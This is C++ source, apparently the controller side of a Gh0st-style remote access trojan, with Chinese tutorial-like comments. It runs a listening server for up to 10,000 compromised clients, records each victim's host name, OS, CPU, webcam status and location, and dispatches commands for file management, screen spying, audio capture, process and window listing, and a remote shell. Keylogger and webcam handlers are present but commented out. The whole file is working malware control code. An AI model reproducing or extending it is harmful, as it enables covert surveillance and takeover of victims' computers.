void CALLBACK CMyRemoteDlg::NotifyProc(LPVOID lpParam, ClientContext* pContext, UINT nCode)
{
	try
	{
		switch (nCode)
		{
		case NC_CLIENT_CONNECT:
			break;
		case NC_CLIENT_DISCONNECT:
			//g_pCcRemoteDlg->PostMessage(WM_REMOVEFROMLIST, 0, (LPARAM)pContext);	// 当服务端断开或出错响应
			break;
		case NC_TRANSMIT:
			break;
		case NC_RECEIVE:
			//ProcessReceive(pContext);        // 这里是有数据到来 但没有完全接收
			break;
		case NC_RECEIVE_COMPLETE:
			ProcessReceiveComplete(pContext);       //这里时完全接收 处理发送来的数据 跟进    ProcessReceiveComplete
			break;
		}
	}
	catch (...) {}
}


//监听端口    最大上线个数
void CMyRemoteDlg::Activate(UINT nPort, UINT nMaxConnections,CString nIp)
{
	CString		str;

	if (m_iocpServer != NULL)
	{
		m_iocpServer->Shutdown();
		delete m_iocpServer;

	}
	m_iocpServer = new CIOCPServer;

	// 开启IPCP服务器 最大连接  端口     查看NotifyProc回调函数  函数定义
	if (m_iocpServer->Initialize((NOTIFYPROC)NotifyProc, NULL, nMaxConnections, nPort, nIp))
	{

		char hostname[256];
		gethostname(hostname, sizeof(hostname));
		HOSTENT* host = gethostbyname(hostname);
		if (host != NULL)
		{
			for (int i = 0; ; i++)
			{
				str += inet_ntoa(*(IN_ADDR*)host->h_addr_list[i]);
				if (host->h_addr_list[i] + host->h_length >= host->h_name)
					break;
				str += "/";
			}
		}

		str.Format("监听端口: %d success", nPort);
		Add_Log_Message(true, str);
	}
	else
	{
		str.Format("监听端口: %d faied", nPort);
		Add_Log_Message(true, str);
	}

}

// 根据ini文件添加监听端口
void CMyRemoteDlg::ListenPort()
{
	// TODO: 在此处添加实现代码.
	int	nPort = ((CMyRemoteApp*)AfxGetApp())->m_IniFile.GetInt("Settings", "ListenPort");         //读取ini 文件中的监听端口
	int	nMaxConnection = ((CMyRemoteApp*)AfxGetApp())->m_IniFile.GetInt("Settings", "MaxConnection");   //读取最大连接数
	CString nIp= ((CMyRemoteApp*)AfxGetApp())->m_IniFile.GetString("Settings", "ListemIp");   //读取IP
	if (nPort == 0)
		nPort = 8088;
	if (nMaxConnection == 0)
		nMaxConnection = 10000;
	Activate(nPort, nMaxConnection,nIp);             //开始监听

}


//lang2.1_10   //处理所有服务端发送来的消息
void CMyRemoteDlg::ProcessReceiveComplete(ClientContext* pContext)
{
	if (pContext == NULL)
		return;

	// 如果管理对话框打开，交给相应的对话框处理
	CDialog* dlg = (CDialog*)pContext->m_Dialog[1];      //这里就是ClientContext 结构体的int m_Dialog[2];

	// 交给窗口处理
	if (pContext->m_Dialog[0] > 0)                //这里查看是否给他赋值了，如果赋值了就把数据传给功能窗口处理
	{
		switch (pContext->m_Dialog[0])
		{
		case FILEMANAGER_DLG:
			((CFileManagerDlg *)dlg)->OnReceiveComplete();
			break;
		case SCREENSPY_DLG:
			((CScreenSpyDlg *)dlg)->OnReceiveComplete();
			break;
		//case WEBCAM_DLG:
		//	((CWebCamDlg *)dlg)->OnReceiveComplete();
		//	break;
		case AUDIO_DLG:
			((CAudioDlg *)dlg)->OnReceiveComplete();
			break;
		//case KEYBOARD_DLG:
		//	((CKeyBoardDlg *)dlg)->OnReceiveComplete();
		//	break;
		case WINDOWS_DLG:
			((CWindowsDlg*)dlg)->OnReceiveComplete();
			break;
		case PROCESS_DLG:
			((CProcessDlg*)dlg)->OnReceiveComplete();
			break;
		case SHELL_DLG:
			((CShellDlg *)dlg)->OnReceiveComplete();
			break;
		case SERVER_DLG:
			((CServerDlg*)dlg)->OnReceiveComplete();
			break;
		default:
			break;
		}
		return;
	}

	switch (pContext->m_DeCompressionBuffer.GetBuffer(0)[0])   //如果没有赋值就判断是否是上线包和打开功能功能窗口
	{                                                           //讲解后回到ClientContext结构体
	/*case TOKEN_AUTH: // 要求验证
		m_iocpServer->Send(pContext, (PBYTE)m_PassWord.GetBuffer(0), m_PassWord.GetLength() + 1);
		break;
	case TOKEN_HEARTBEAT: // 回复心跳包
		{
			BYTE	bToken = COMMAND_REPLAY_HEARTBEAT;
			m_iocpServer->Send(pContext, (LPBYTE)&bToken, sizeof(bToken));
		}

		break;*/
	case TOKEN_LOGIN: // 上线包
	{
		//这里处理上线
		if (m_iocpServer->m_nMaxConnections <= g_pMyRemoteDlg->m_CList_Online.GetItemCount())
		{
			closesocket(pContext->m_Socket);
		}
		else
		{
			pContext->m_bIsMainSocket = true;
			g_pMyRemoteDlg->PostMessage(WM_ADDTOLIST, 0, (LPARAM)pContext);
		}
		// 激活
		BYTE	bToken = COMMAND_ACTIVED;
		m_iocpServer->Send(pContext, (LPBYTE)&bToken, sizeof(bToken));
	}

		break;
	/*case TOKEN_DRIVE_LIST: // 驱动器列表
		// 指接调用public函数非模态对话框会失去反应， 不知道怎么回事,太菜
		g_pConnectView->PostMessage(WM_OPENMANAGERDIALOG, 0, (LPARAM)pContext);
		break;
	case TOKEN_BITMAPINFO: //
		// 指接调用public函数非模态对话框会失去反应， 不知道怎么回事
		g_pConnectView->PostMessage(WM_OPENSCREENSPYDIALOG, 0, (LPARAM)pContext);
		break;
	case TOKEN_WEBCAM_BITMAPINFO: // 摄像头
		g_pConnectView->PostMessage(WM_OPENWEBCAMDIALOG, 0, (LPARAM)pContext);
		break;
	case TOKEN_KEYBOARD_START:
		g_pMyRemoteDlg->PostMessage(WM_OPENKEYBOARDDIALOG, 0, (LPARAM)pContext);
		break;*/
	case TOKEN_AUDIO_START: // 语音
		g_pMyRemoteDlg->PostMessage(WM_OPENAUDIODIALOG, 0, (LPARAM)pContext);
		break;
	case TOKEN_DRIVE_LIST: // 驱动器列表
	// 指接调用public函数非模态对话框会失去反应
		g_pMyRemoteDlg->PostMessage(WM_OPENMANAGERDIALOG, 0, (LPARAM)pContext);
		break;
	case TOKEN_BITMAPINFO: //
	// 指接调用public函数非模态对话框会失去反应， 不知道怎么回事
		g_pMyRemoteDlg->PostMessage(WM_OPENSCREENSPYDIALOG, 0, (LPARAM)pContext);
		break;
	case TOKEN_WSLIST:
		g_pMyRemoteDlg->PostMessage(WM_OPENWINDOWSDIALOG, 0, (LPARAM)pContext);
		break;
	case TOKEN_PSLIST:
		g_pMyRemoteDlg->PostMessage(WM_OPENPROCESSDIALOG, 0, (LPARAM)pContext);
		break;
	case TOKEN_SHELL_START:
		g_pMyRemoteDlg->PostMessage(WM_OPENSHELLDIALOG, 0, (LPARAM)pContext);
		break;
	case  TOKEN_SERVERLIST:
		g_pMyRemoteDlg->PostMessage(WM_OPENSERVERDIALOG, 0, (LPARAM)pContext);
		break;
		// 命令停止当前操作
	default:
		closesocket(pContext->m_Socket);
		break;
	}
}


LRESULT CMyRemoteDlg::OnOnlineAddToList(WPARAM wParam, LPARAM lParam)
{
	CString strIP, strAddr, strPCName, strOS, strCPU, strVideo, strPing;
	ClientContext* pContext = (ClientContext*)lParam;    //注意这里的  ClientContext  正是发送数据时从列表里取出的数据

	if (pContext == NULL)
		return -1;

	CString	strToolTipsText;
	try
	{
		//int nCnt = m_pListCtrl->GetItemCount();

		// 不合法的数据包
		if (pContext->m_DeCompressionBuffer.GetBufferLen() != sizeof(LOGININFO))
			return -1;

		LOGININFO* LoginInfo = (LOGININFO*)pContext->m_DeCompressionBuffer.GetBuffer();

		// ID
		//CString	str;
		//str.Format("%d", m_nCount++);	

		// IP地址
		//int i = m_pListCtrl->InsertItem(nCnt, str, 15);

		// 外网IP

		sockaddr_in  sockAddr;
		memset(&sockAddr, 0, sizeof(sockAddr));
		int nSockAddrLen = sizeof(sockAddr);
		BOOL bResult = getpeername(pContext->m_Socket, (SOCKADDR*)&sockAddr, &nSockAddrLen);
		CString IPAddress = bResult != INVALID_SOCKET ? inet_ntoa(sockAddr.sin_addr) : "";
		//m_pListCtrl->SetItemText(i, 1, IPAddress);
		strIP = IPAddress;

		// 内网IP
		//m_pListCtrl->SetItemText(i, 2, inet_ntoa(LoginInfo->IPAddress));
		//strAddr=inet_ntoa(LoginInfo->IPAddress);
		// 主机名
		//m_pListCtrl->SetItemText(i, 3, LoginInfo->HostName);
		strPCName = LoginInfo->HostName;
		// 系统

		////////////////////////////////////////////////////////////////////////////////////////
		// 显示输出信息
		char* pszOS = NULL;
		switch (LoginInfo->OsVerInfoEx.dwPlatformId)
		{

		case VER_PLATFORM_WIN32_NT:
			if (LoginInfo->OsVerInfoEx.dwMajorVersion <= 4)
				pszOS = "NT";
			if (LoginInfo->OsVerInfoEx.dwMajorVersion == 5 && LoginInfo->OsVerInfoEx.dwMinorVersion == 0)
				pszOS = "2000";
			if (LoginInfo->OsVerInfoEx.dwMajorVersion == 5 && LoginInfo->OsVerInfoEx.dwMinorVersion == 1)
				pszOS = "XP";
			if (LoginInfo->OsVerInfoEx.dwMajorVersion == 5 && LoginInfo->OsVerInfoEx.dwMinorVersion == 2)
				pszOS = "2003";
			if (LoginInfo->OsVerInfoEx.dwMajorVersion == 6 && LoginInfo->OsVerInfoEx.dwMinorVersion == 0)
				pszOS = "Vista";  // Just Joking
		}
		strOS.Format
		(
			"%s SP%d (Build %d)",
			//OsVerInfo.szCSDVersion,
			pszOS,
			LoginInfo->OsVerInfoEx.wServicePackMajor,
			LoginInfo->OsVerInfoEx.dwBuildNumber
		);
		//m_pListCtrl->SetItemText(i, 4, strOS);

		// CPU
		strCPU.Format("%dMHz", LoginInfo->CPUClockMhz);
		//m_pListCtrl->SetItemText(i, 5, str);

		// Speed
		strPing.Format("%d", LoginInfo->dwSpeed);
		//m_pListCtrl->SetItemText(i, 6, str);


		strVideo = LoginInfo->bIsWebCam ? "有" : "--";
		//m_pListCtrl->SetItemText(i, 7, str);

		strToolTipsText.Format("New Connection Information:\nHost: %s\nIP  : %s\nOS  : Windows %s", LoginInfo->HostName, IPAddress, strOS);

		if (((CMyRemoteApp*)AfxGetApp())->m_bIsQQwryExist)
		{

			strAddr = m_QQwry->IPtoAdd(IPAddress);

			//strToolTipsText += "\nArea: ";
			//strToolTipsText += str;
		}
		// 指定唯一标识
		//m_pListCtrl->SetItemData(i, (DWORD) pContext);    //这里将服务端的套接字等信息加入列表中保存
		Add_Online_Message(strIP, strAddr, strPCName, strOS, strCPU, strVideo, strPing, pContext);
	}
	catch (...) {}

	return 0;
}


void CMyRemoteDlg::SendSelectCommand(PBYTE pData, UINT nSize)
{

	POSITION pos = m_CList_Online.GetFirstSelectedItemPosition(); //iterator for the CListCtrl
	while (pos) //so long as we have a valid POSITION, we keep iterating
	{
		int	nItem = m_CList_Online.GetNextSelectedItem(pos);                          //lang2.1_2
		ClientContext* pContext = (ClientContext*)m_CList_Online.GetItemData(nItem); //从列表条目中取出ClientContext结构体
		// 发送获得驱动器列表数据包                                                 //查看  ClientContext结构体
		m_iocpServer->Send(pContext, pData, nSize);      //调用  m_iocpServer  的Send 函数发送数据  查看m_iocpServer 定义

		//Save the pointer to the new item in our CList
	} //EO while(pos) -- at this point we have deleted the moving items and stored them in memoryt	
}